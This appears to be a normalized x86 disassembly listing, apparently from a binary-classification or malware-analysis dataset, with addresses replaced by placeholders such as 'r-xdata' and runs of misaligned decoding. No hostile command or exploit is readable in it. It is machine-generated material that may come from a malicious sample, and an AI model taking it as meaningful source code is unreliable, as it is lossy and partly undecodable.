mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_463ac8
test al al
je r-xdata
test esi esi
jne r-xdata
test esi esi
jle r-xdata
xor esi esi
cmp [ ebx + 0x7c ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov eax esi
cdq
push edx
push eax
mov eax [ ebx + 0xa4 ]
call sub_41a444
cmp [ ebx + 0x78 ] 0x0
je r-xdata
mov eax [ ebx + 0x74 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x7c ]
mov ecx [ eax ]
call [ ecx + 0x50 ]
test al al
je r-xdata
jmp r-xdata
cmp [ ebx + 0x68 ] 0x0
je r-xdata
push 0x0
push 0x0
mov eax [ ebx + 0xa4 ]
call sub_41a3e0
mov edx [ ebx + 0xa4 ]
mov eax [ ebx + 0x78 ]
mov ecx [ eax ]
call [ ecx + 0x48 ]
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov esi eax
cmp eax 0x0
jne r-xdata
mov cx 0x2
xor edx edx
mov eax [ ebx + 0x74 ]
mov edi [ eax ]
call [ edi + 0x14 ]
mov edi [ ebx + 0xa4 ]
mov eax edi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ edi + 0x4 ]
mov eax [ ebx + 0x74 ]
call sub_41a624
mov eax [ ebx + 0xa4 ]
mov edx [ eax ]
call [ edx ]
mov edx eax
test edx edx
jle r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x4 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463b7c
mov eax 0x1
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
mov cl [ ecx + eax ]
and cl 0x7f
push ecx
mov ecx [ ebx + 0xa4 ]
mov ecx [ ecx + 0x4 ]
lea edi [ ecx + eax ]
pop ecx
mov [ edi ] cl
inc eax
dec edx
jne r-xdata
sub_46a094
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp - 0x4 ]
call sub_4043f0
xor eax eax
push ebp
push sub_46a2b2
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp + 0xc ] 0xffffffff
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_404200
test eax eax
jne r-xdata
mov eax [ esi + 0x88 ]
mov [ ebp + 0xc ] eax
mov [ esi + 0x98 ] 0x0
mov [ esi + 0x99 ] 0x0
xor ebx ebx
xor eax eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_403fd8
mov eax ebx
dec eax
cmp eax [ ebp + 0xc ]
jle r-xdata
mov eax [ esi + 0x74 ]
call sub_46b008
mov edx eax
add edx [ ebp - 0xc ]
mov ecx edi
sub ecx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_465890
mov ebx eax
test ebx ebx
jle r-xdata
test ebx ebx
jne r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ ebp - 0xc ] edi
add ebx [ ebp - 0xc ]
test ebx ebx
jle r-xdata
mov eax [ ebp - 0xc ]
cmp eax [ ebp + 0xc ]
jle r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
mov eax [ esi + 0x74 ]
mov edx [ eax ]
call [ edx ]
mov edi eax
test edi edi
jle r-xdata
mov eax [ ebp - 0x4 ]
call sub_404200
mov edx eax
add edx ebx
dec edx
mov ecx [ ebp + 0x8 ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
call sub_404200
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404200
sub ebx eax
mov eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_40434c
jne r-xdata
mov cl 0x1
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x48 ]
cmp [ ebp - 0x8 ] 0xffffffff
sete al
push eax
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax esi
mov edi [ eax ]
call [ edi + 0x6c ]
test eax eax
sete al
mov [ esi + 0x99 ] al
cmp [ esi + 0x99 ] 0x0
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov edx ebx
call sub_40458c
test ebx ebx
jle r-xdata
mov eax [ ebp + 0x8 ]
call sub_403f40
jmp r-xdata
cmp [ esi + 0x84 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a2b9
lea eax [ ebp - 0x14 ]
mov edx 0x2
call sub_403f64
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax + ebx - 0x1 ] 0xd
jne r-xdata
mov [ esi + 0x98 ] 0x1
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
mov eax [ esi + 0x74 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
mov edx ebx
dec edx
mov eax [ ebp + 0x8 ]
call sub_40458c
jmp r-xdata
sub_46a2d0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46a346
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_403f40
xor esi esi
jmp r-xdata
mov eax [ ebx ]
call sub_404200
test eax eax
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a34d
lea eax [ ebp - 0xc ]
call sub_403f40
retn
cmp esi [ ebp - 0x8 ]
jl r-xdata
inc esi
push 0xffffffff
lea eax [ ebp - 0xc ]
push eax
or ecx 0xffffffff
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x70 ]
mov eax [ ebp - 0xc ]
mov edx ebx
call sub_408120
sub_46a357
inc [ ecx ]
add [ eax ] al
add [ edx ] cl
add [ eax ] al
add [ ebx - 0x75 ] dl
fmul [ ebx - 0x5a178bbd ]
or eax [ eax ]
add dh al
inc ebx
imul eax [ eax ] 0x408dc35b
add [ ebp - 0x75 ] dl
in al dx
push ebx
push esi
mov esi ecx
mov ebx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx esi
mov ecx [ ebp + 0x8 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x60 ]
pop esi
pop ebx
pop ebp
retn 0x4
sub_46a398
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_41e9f4
cmp bl 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp esi [ edi + 0x78 ]
jne r-xdata
cmp esi [ edi + 0x7c ]
jne r-xdata
xor eax eax
mov [ edi + 0x78 ] eax
xor eax eax
mov [ edi + 0x7c ] eax
sub_46a3e0
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
test esi esi
jne r-xdata
cmp [ ebx + 0x70 ] 0x0
je r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032f8
test al al
je r-xdata
xor eax eax
mov [ ebx + 0xac ] eax
jmp r-xdata
lea eax [ ebx + 0x7c ]
call sub_40d3ac
mov [ ebx + 0x70 ] 0x0
mov eax esi
mov [ ebx + 0x7c ] eax
test eax eax
je r-xdata
mov [ ebx + 0xac ] esi
pop esi
pop ebx
retn
mov edx ebx
call sub_41e7a8
sub_46a438
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
call sub_404200
test eax eax
jle r-xdata
pop esi
pop ebx
retn
push 0x0
mov edx esi
mov ecx eax
mov eax ebx
call sub_46a45c
sub_46a45c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46a65c
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a663
lea eax [ ebp - 0x1c ]
call sub_403f40
retn
test esi esi
je r-xdata
mov cl 0x1
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax [ ebx + 0xb0 ]
test eax eax
sete dl
or dl [ ebp + 0x8 ]
je r-xdata
mov edx esi
mov ecx [ ebp - 0x4 ]
call sub_41a624
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov esi [ ebx + 0xb4 ]
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_46aa90
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46a5dd
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_41a624
cmp [ ebx + 0x78 ] 0x0
je r-xdata
pop edx
pop eax
jg r-xdata
cmp eax [ esp ]
pop edx
pop eax
ja r-xdata
mov [ ebp - 0xc ] 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_41a3e0
mov eax [ ebx + 0x78 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
test esi esi
jle r-xdata
jmp r-xdata
mov ecx esi
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
add [ ebp - 0xc ] esi
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x6c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_463b7c
mov edx esi
mov eax ebx
call sub_46a9e8
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea edx [ eax + edx - 0x1 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x58 ]
mov esi eax
xor ecx ecx
xor edx edx
mov eax [ r-xdata ]
call sub_465ec8
test esi esi
sete al
mov [ ebx + 0x69 ] al
xor ecx ecx
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
push 0x2
mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
mov [ ebp - 0x10 ] 0x2746
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_463ac8
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x8 ]
call sub_40d3ac
retn
sub_46a66c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_46a78e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_408890
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405d94
mov eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x18 ]
xor ecx ecx
pop eax
call sub_409118
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x20
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a874
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46a731
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x80 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_40316c
retn
cmp [ edi + 0x78 ] 0x0
jne r-xdata
test bl bl
je r-xdata
cmp [ edi + 0xac ] 0x0
je r-xdata
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax [ edi + 0xac ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xc ]
mov edx esi
call ebx
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a795
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f64
retn
sub_46a7a0
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
test cl cl
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_46a45c
pop edx
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov [ esp ] eax
sub_46a7d4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46a81c
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
mov edx esi
call sub_40424c
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a823
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
sub_46a82b
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_46a9aa
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
push 0x0
push 0x0
mov eax esi
call sub_41a3e0
mov eax esi
call sub_41a3c0
add ebx eax
mov [ ebp - 0x10 ] ebx
mov eax esi
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
xor eax eax
push ebp
push sub_46a98d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_46a96e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xa8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov cl 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_46a7a0
mov eax esi
call sub_41a3c0
mov ebx [ ebp - 0x10 ]
sub ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46a975
lea eax [ ebp - 0xc ]
call sub_40d3ac
retn
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_46a45c
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
mov eax esi
call sub_41a3c0
push eax
mov eax [ ebp - 0x10 ]
pop edx
sub eax edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xa8 ]
call sub_465564
mov ebx eax
test ebx ebx
je r-xdata
sub_46a9bc
push ebx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x69 ] 0x1
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x78 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x44 ]
sub_46a9e8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
jle r-xdata
cmp eax 0x0
jbe r-xdata
pop esi
pop ebx
retn
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push 0x1
mov esi [ ebx + 0xb0 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_46a45c
mov eax ebx
call sub_46aa74
jmp r-xdata
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
push 0x1
mov eax [ ebx + 0xb0 ]
mov edx [ eax + 0x4 ]
mov ecx esi
mov eax ebx
call sub_46a45c
mov edx esi
mov eax [ ebx + 0xb0 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_46aa90
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_40313c
mov eax [ ebp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46aad8
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46ab5e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax edi
mov ecx esi
mov edx [ ebx + 0x4 ]
call sub_404030
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ab65
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
sub_46ab6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46ac41
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx esi
mov edi [ ebx + 0x4 ]
mov edx edi
lea eax [ edi + esi ]
call sub_4028d8
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax ebx
call sub_41aad0
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ac48
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
sub_46ac50
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jle r-xdata
mov eax esi
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn 0x4
xor ecx ecx
mov edx eax
test edx edx
jl r-xdata
test cl cl
jne r-xdata
inc edx
mov eax [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x64 ]
add eax 0x2
dec edx
jne r-xdata
mov cl 0x1
jmp r-xdata
cmp si [ eax ]
jne r-xdata
sub_46ac9c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_46adc4
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40313c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_46ad9a
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_46a2d0
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_404200
cmp eax 0x3
jle r-xdata
mov eax [ ebx + 0x80 ]
mov edx [ ebp - 0x8 ]
call sub_467ca0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ada1
lea eax [ ebp - 0x8 ]
call sub_40d3ac
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x3
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404460
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov ecx r-xdata
call sub_40424c
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x4
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404460
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_4080e8
test al al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_46a2d0
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_404200
cmp eax 0x4
jl r-xdata
sub_46addc
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46ae2a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_467dac
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46ae31
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_467b28
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
sub_46ae38
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_46aede
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov esi eax
dec esi
test esi esi
jl r-xdata
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46aee5
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f64
retn
inc esi
xor ebx ebx
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
mov edx r-xdata
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x7c ]
jmp r-xdata
lea ecx [ ebp - 0xc ]
mov edx ebx
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xc ]
mov eax [ ebp - 0xc ]
mov edx r-xdata
call sub_40434c
jne r-xdata
inc ebx
dec esi
jne r-xdata
sub_46af24
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_46aa90
mov [ esi + 0x20 ] 0x8000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403490
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_4034e8
pop [ fs : 0x0 ]
add esp 0xc
sub_46af6c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46aff8
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
call sub_46b008
mov edx eax
mov eax edi
mov ecx esi
call sub_404030
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46afff
lea eax [ ebp - 0x4 ]
call sub_403f40
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405d94
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9cc
call sub_4038f8
jmp r-xdata
sub_46b014
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x24 ]
test esi esi
jle r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
add eax esi
call sub_4028d8
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
xor eax eax
mov [ ebx + 0x24 ] eax
sub_46b04c
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46b100
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
